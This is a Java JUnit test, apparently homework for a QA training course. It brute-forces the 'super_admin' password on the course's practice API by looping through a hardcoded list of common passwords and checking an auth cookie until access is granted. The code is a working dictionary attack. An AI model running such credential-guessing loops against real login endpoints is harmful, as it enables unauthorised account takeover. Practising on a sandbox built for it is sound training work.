package homework;

import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.*;

import static io.restassured.RestAssured.given;

public class HomeworkPasswordTest {

    @Test
    public void shouldExtractUniquePasswords() {
        String loginUrl = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String checkUrl = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
        String rawPasswords = "\tpassword\tpassword\t123456\t123456\t123456\t123456\t123456\t123456\t123456\n" +
                "\t123456\t123456\tpassword\tpassword\tpassword\tpassword\tpassword\tpassword\t123456789\n" +
                "\t12345678\t12345678\t12345678\t12345\t12345678\t12345\t12345678\t123456789\tqwerty\n" +
                "\tqwerty\tabc123\tqwerty\t12345678\tqwerty\t12345678\tqwerty\t12345678\tpassword\n" +
                "\tabc123\tqwerty\tabc123\tqwerty\t12345\tfootball\t12345\t12345\t1234567\n" +
                "\tmonkey\tmonkey\t123456789\t123456789\t123456789\tqwerty\t123456789\t111111\t12345678\n" +
                "\t1234567\tletmein\t111111\t1234\tfootball\t1234567890\tletmein\t1234567\t12345\n" +
                "\tletmein\tdragon\t1234567\tbaseball\t1234\t1234567\t1234567\tsunshine\tiloveyou\n" +
                "\ttrustno1\t111111\tiloveyou\tdragon\t1234567\tprincess\tfootball\tqwerty\t111111\n" +
                "\tdragon\tbaseball\tadobe123[a]\tfootball\tbaseball\t1234\tiloveyou\tiloveyou\t123123\n" +
                "\tbaseball\tiloveyou\t123123\t1234567\twelcome\tlogin\tadmin\tprincess\tabc123\n" +
                "\t111111\ttrustno1\tadmin\tmonkey\t1234567890\twelcome\twelcome\tadmin\tqwerty123\n" +
                "\tiloveyou\t1234567\t1234567890\tletmein\tabc123\tsolo\tmonkey\twelcome\t1q2w3e4r\n" +
                "\tmaster\tsunshine\tletmein\tabc123\t111111\tabc123\tlogin\t666666\tadmin\n" +
                "\tsunshine\tmaster\tphotoshop[a]\t111111\t1qaz2wsx\tadmin\tabc123\tabc123\tqwertyuiop\n" +
                "\tashley\t123123\t1234\tmustang\tdragon\t121212\tstarwars\tfootball\t654321\n" +
                "\tbailey\twelcome\tmonkey\taccess\tmaster\tflower\t123123\t123123\t555555\n" +
                "\tpassw0rd\tshadow\tshadow\tshadow\tmonkey\tpassw0rd\tdragon\tmonkey\tlovely\n" +
                "\tshadow\tashley\tsunshine\tmaster\tletmein\tdragon\tpassw0rd\t654321\t7777777\n" +
                "\t123123\tfootball\t12345\tmichael\tlogin\tsunshine\tmaster\t!@#$%^&*\twelcome\n" +
                "\t654321\tjesus\tpassword1\tsuperman\tprincess\tmaster\thello\tcharlie\t888888\n" +
                "\tsuperman\tmichael\tprincess\t696969\tqwertyuiop\thottie\tfreedom\taa123456\tprincess\n" +
                "\tqazwsx\tninja\tazerty\t123123\tsolo\tloveme\twhatever\tdonald\tdragon\n" +
                "\tmichael\tmustang\ttrustno1\tbatman\tpassw0rd\tzaq1zaq1\tqazwsx\tpassword1\tpassword1\n" +
                "\tFootball\tpassword1\t000000\ttrustno1\tstarwars\tpassword1\ttrustno1\tqwerty123\t123qwe";

        Set<String> passwordList = new TreeSet<>(Arrays.asList(rawPasswords.trim().split("\\s+")));

        for (String password : passwordList) {
            Map<String, String> body = new HashMap<>();
            body.put("login", "super_admin");
            body.put("password", password);

            Response loginResponse = given()
                    .formParams(body)
                    .post(loginUrl)
                    .andReturn();

            String authCookie = loginResponse.getCookie("auth_cookie");

            Response checkResponse = given()
                    .cookies("auth_cookie", authCookie)
                    .get(checkUrl)
                    .andReturn();

            String result = checkResponse.getBody().asString();

            if (!result.equals("You are NOT authorized")) {
                System.out.println("Пароль: " + password);
                System.out.println("Ответ: " + result);
                break;
            }
        }
    }
}